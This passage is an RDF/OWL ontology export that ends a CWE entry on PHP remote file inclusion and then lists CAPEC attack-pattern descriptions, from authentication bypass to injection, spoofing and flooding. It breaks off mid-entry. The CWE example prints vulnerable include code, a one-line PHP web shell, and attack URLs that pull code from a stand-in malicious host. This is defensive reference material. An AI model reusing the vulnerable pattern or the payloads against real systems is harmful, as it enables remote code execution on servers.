                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.

(bad code)
Example Language: PHP 
$dir = $_GET['module_name'];
include($dir . \"/function.php\");
The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of \"http://malicious.example.com\" by using the following request string:

(attack code)
 
victim.php?module_name=http://malicious.example.com
Upon receiving this request, the code would set 'module_name' to the value \"http://malicious.example.com\" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains.

For the sake of this example, assume that the malicious version of function.php looks like the following:

(bad code)
 
system($_GET['cmd']);
An attacker could now go a step further in our example and provide a request string as follows:

(attack code)
 
victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l
The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:

(attack code)
 
/bin/ls -l
Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.
Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     languages  "PHP"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.
Effectiveness: High"^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction

Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.
This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Set allow_url_fopen to false, which limits the ability to include files from remote locations.
Effectiveness: High

Note: Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009."^^xsd:string, 
                 rdfs:comment "Strategy: Firewall

Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
Effectiveness: Moderate

Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

The external control or influence of filenames can often be detected using automated static analysis that models data flow within the software.
Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines."^^xsd:string
                 
                 static  "automated"^^xsd:string
    
    
Individual: CAPEC-1

    Annotations: 
        rdfs:comment "In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-10

    Annotations: 
        rdfs:comment "This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the attacker finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-101

    Annotations: 
        rdfs:comment "An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-102

    Annotations: 
        rdfs:comment "Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim.

This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-104

    Annotations: 
        rdfs:comment "An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security. In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from \"Restful Privilege Escalation\" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-108

    Annotations: 
        rdfs:comment "An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-109

    Annotations: 
        rdfs:comment "An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject his or her own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-11

    Annotations: 
        rdfs:comment "An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process. This type of vulnerability has been found in many widely used servers including IIS, Lotus Domino, and Orion. The attacker's job in this case is straightforward, standard communication protocols and methods are used and are generally appended with malicious information at the tail end of an otherwise legitimate request. The attack payload varies, but it could be special characters like a period or simply appending a tag that has a special meaning for operations on the server side like .jsp for a java application server. The essence of this attack is that the attacker deceives the server into executing functionality based on the name of the request, i.e. login.jsp, not the contents."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-110

    Annotations: 
        rdfs:comment "An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-111

    Annotations: 
        rdfs:comment "An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website. An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server. There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-112

    Annotations: 
        rdfs:comment "In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset. Examples of secrets can include, but are not limited to, passwords, encryption keys, database lookup keys, and initial values to one-way functions.

The key factor in this attack is the attackers' ability to explore the possible secret space rapidly. This, in turn, is a function of the size of the secret space and the computational power the attacker is able to bring to bear on the problem. If the attacker has modest resources and the secret space is large, the challenge facing the attacker is intractable. While the defender cannot control the resources available to an attacker, they can control the size of the secret space. Creating a large secret space involves selecting one's secret from as large a field of equally likely alternative secrets as possible and ensuring that an attacker is unable to reduce the size of this field using available clues or cryptanalysis. Doing this is more difficult than it sounds since elimination of patterns (which, in turn, would provide an attacker clues that would help them reduce the space of potential secrets) is difficult to do using deterministic machines, such as computers. Assuming a finite secret space, a brute force attack will eventually succeed. The defender must rely on making sure that the time and resources necessary to do so will exceed the value of the information. For example, a secret space that will likely take hundreds of years to explore is likely safe from raw-brute force attacks."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-114

    Annotations: 
        rdfs:comment "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the \"Exploitation of Session Variables, Resource IDs and other Trusted Credentials\" attack patterns."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-115

    Annotations: 
        rdfs:comment "An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place. This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users."^^xsd:string,
        rdfs:comment "Authentication Bypass"^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-12

    Annotations: 
        rdfs:comment "This pattern of attack is defined by the selection of messages distributed over via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-120

    Annotations: 
        rdfs:comment "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-121

    Annotations: 
        rdfs:comment "An attacker exploits a sample, demonstration, or test API that is insecure by default and should not be resident on production systems. Some applications include APIs that are intended to allow an administrator to test and refine their domain. These APIs should usually be disabled once a system enters a production environment. Testing APIs may expose a great deal of diagnostic information intended to aid an administrator, but which can also be used by an attacker to further refine their attack. Moreover, testing APIs may not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may have many flaws and vulnerabilities that would allow an attacker to severely disrupt a target."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-122

    Annotations: 
        rdfs:comment "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-125

    Annotations: 
        rdfs:comment "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-127

    Annotations: 
        rdfs:comment "An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-13

    Annotations: 
        rdfs:comment "The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-130

    Annotations: 
        rdfs:comment "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-132

    Annotations: 
        rdfs:comment "An attacker positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name. The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications. In some variants of this attack the attacker may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the attacker may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the attacker to control the actions of the target or to cause the target to expose information to the attacker. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the attacker would normally have."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-133

    Annotations: 
        rdfs:comment "An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is blindly attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-134

    Annotations: 
        rdfs:comment "An attacker manipulates the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol. Many applications allow users to send email messages by filling in fields. For example, a web site may have a link to \"share this site with a friend\" where the user provides the recipient's email address and the web application fills out all the other fields, such as the subject and body. In this pattern, an attacker adds header and body information to an email message by injecting additional content in an input field used to construct a header of the mail message. This attack takes advantage of the fact that RFC 822 requires that headers in a mail message be separated by a carriage return. As a result, an attacker can inject new headers or content simply by adding a delimiting carriage return and then supplying the new heading and body information. This attack will not work if the user can only supply the message body since a carriage return in the body is treated as a normal character."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-135

    Annotations: 
        rdfs:comment "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-136

    Annotations: 
        rdfs:comment "An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-14

    Annotations: 
        rdfs:comment "This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-141

    Annotations: 
        rdfs:comment "An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-142

    Annotations: 
        rdfs:comment "A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-145

    Annotations: 
        rdfs:comment "An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-146

    Annotations: 
        rdfs:comment "An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema. Possible attacks are denial of service attacks by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data. In addition, manipulation of the data types described in the schema may affect the results of calculations taken by the document reader. For example, a float field could be changed to an int field. Finally, the adversary may change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might us a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-147

    Annotations: 
        rdfs:comment "An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-148

    Annotations: 
        rdfs:comment "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-15

    Annotations: 
        rdfs:comment "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-151

    Annotations: 
        rdfs:comment "Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials. Alternatively, an adversary may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. Identity Spoofing attacks need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the adversary attempts to change the apparent identity. This attack differs from Content Spoofing attacks where the adversary does not wish to change the apparent identity of the message but instead wishes to change what the message says. In an Identity Spoofing attack, the adversary is attempting to change the identity of the content."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-155

    Annotations: 
        rdfs:comment "An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-157

    Annotations: 
